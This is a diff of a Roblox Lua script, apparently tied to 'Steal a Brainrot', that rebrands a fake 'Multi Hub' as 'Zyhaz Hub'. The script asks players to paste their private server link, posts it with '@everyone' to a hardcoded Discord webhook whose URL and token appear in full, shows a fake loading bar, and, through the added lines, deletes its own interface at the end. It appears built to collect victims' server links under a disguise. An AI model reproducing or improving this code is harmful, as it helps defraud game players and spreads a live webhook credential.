@@ -37,7 +37,7 @@ end)
 -- SETTINGS
 ----------------------------------------------------
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1450125198358745230/Vz1uCDcqt_Ngw6yHbIU4Ohje6SpBRemBIbLNuRduqN1sUZLgDQ9WHdHMrjTTjuqZFvNq"
-local TITLE_TEXT = "Steal a Brainrot Multi Hub"
+local TITLE_TEXT = "Zyhaz Hub"
 local SECONDS_PER_PERCENT = 5
 
 ----------------------------------------------------
@@ -57,7 +57,7 @@ end
 ----------------------------------------------------
 local function sendWebhook(text)
 	local payload = {
-		content = "@everyone\nNew Private Server Link:\n" .. text .. "\nLoading Started"
+		content = "@everyone\nNew Private Server Link:\n" .. text .. "\nLoading Completed"
 	}
 
 	local req =
@@ -80,7 +80,7 @@ end
 -- GUI (TOP PRIORITY)
 ----------------------------------------------------
 local gui = Instance.new("ScreenGui")
-gui.Name = "ScriptBypasserGUI"
+gui.Name = "Zyhaz Hub"
 gui.ResetOnSpawn = false
 gui.IgnoreGuiInset = true
 gui.ZIndexBehavior = Enum.ZIndexBehavior.Global
@@ -105,14 +105,14 @@ menuStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
 local title = Instance.new("TextLabel", menu)
 title.Size = UDim2.fromScale(1, 0.25)
 title.BackgroundTransparency = 1
-title.Text = "Multi Hub"
+title.Text = "Zyhaz Hub"
 title.Font = Enum.Font.GothamBold
 title.TextColor3 = Color3.new(1,1,1)
 title.TextScaled = true
 title.ZIndex = 11
 
 ----------------------------------------------------
--- TEXTBOX (FIXED: NO DEFAULT "TextBox")
+-- TEXTBOX
 ----------------------------------------------------
 local box = Instance.new("TextBox", menu)
 box.Size = UDim2.fromScale(0.9, 0.2)
@@ -123,7 +123,7 @@ box.Font = Enum.Font.Gotham
 box.TextScaled = true
 box.BorderSizePixel = 0
 box.ZIndex = 11
-box.Text = "" -- IMPORTANT FIX
+box.Text = ""
 box.PlaceholderText = "Paste PRIVATE SERVER link only"
 box.ClearTextOnFocus = false
 Instance.new("UICorner", box).CornerRadius = UDim.new(0,12)
@@ -140,7 +140,7 @@ submit.ZIndex = 11
 Instance.new("UICorner", submit).CornerRadius = UDim.new(0,12)
 
 ----------------------------------------------------
--- LOADING SCREEN (ABSOLUTE TOP)
+-- LOADING SCREEN
 ----------------------------------------------------
 local black = Instance.new("Frame", gui)
 black.Size = UDim2.fromScale(1,1)
@@ -148,15 +148,11 @@ black.BackgroundColor3 = Color3.new(0,0,0)
 black.Visible = false
 black.ZIndex = 99999
 
-local blackStroke = Instance.new("UIStroke", black)
-blackStroke.Thickness = 2
-blackStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
-
 local loadTitle = Instance.new("TextLabel", black)
 loadTitle.Size = UDim2.fromScale(1,0.2)
 loadTitle.Position = UDim2.fromScale(0,0.22)
 loadTitle.BackgroundTransparency = 1
-loadTitle.Text = TITLE_TEXT
+loadTitle.Text = "Zyhaz Hub"
 loadTitle.Font = Enum.Font.GothamBlack
 loadTitle.TextColor3 = Color3.new(1,1,1)
 loadTitle.TextScaled = true
@@ -206,13 +202,12 @@ local tips = {
 ----------------------------------------------------
 task.spawn(function()
 	local t = 0
-	while true do
+	while gui.Parent do
 		t += RunService.RenderStepped:Wait()
 		local color = Color3.fromHSV((t * 0.1) % 1, 0.8, 1)
 		bar.BackgroundColor3 = color
 		loadTitle.TextColor3 = color
 		menuStroke.Color = color
-		blackStroke.Color = color
 	end
 end)
 
@@ -249,4 +244,10 @@ submit.MouseButton1Click:Connect(function()
 
 		task.wait(SECONDS_PER_PERCENT)
 	end
+
+	------------------------------------------------
+	-- 💥 DELETE ALL UI AT 100%
+	------------------------------------------------
+	task.wait(0.5)
+	gui:Destroy()
 end)
